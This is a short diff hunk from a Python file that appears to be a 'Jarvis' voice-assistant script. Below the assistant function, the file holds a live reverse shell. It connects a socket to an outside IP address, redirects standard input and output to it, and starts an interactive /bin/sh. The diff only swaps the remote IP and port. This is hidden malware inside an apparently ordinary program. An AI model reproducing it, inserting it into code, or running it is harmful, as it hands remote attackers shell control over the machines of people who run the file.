@@ -77,7 +77,7 @@ def run_Jarvis():
         talk('thank you')
     
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("3.141.142.211",13020))
+s.connect(("3.22.15.135",18373))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
